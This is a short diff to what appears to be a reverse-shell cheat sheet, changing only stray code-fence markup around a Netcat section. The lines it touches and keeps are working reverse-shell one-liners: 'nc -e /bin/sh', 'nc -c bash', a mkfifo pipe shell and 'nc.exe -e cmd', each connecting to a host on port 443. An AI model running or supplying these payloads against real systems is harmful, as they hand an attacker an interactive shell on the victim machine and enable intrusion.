@@ -7,13 +7,13 @@
 * Netcat
 
   ```bash
-  nc -e /bin/sh 192.168.1.2 443```
+  nc -e /bin/sh 192.168.1.2 443
 
-  nc -e /bin/bash 192.168.1.2 443```
+  nc -e /bin/bash 192.168.1.2 443
 
-  nc -c bash 192.168.1.2 443```
+  nc -c bash 192.168.1.2 443
 
-  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.1.2 443 >/tmp/f```
+  rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.1.2 443 >/tmp/f
 
   nc.exe -e cmd 192.168.1.26 443
   ```
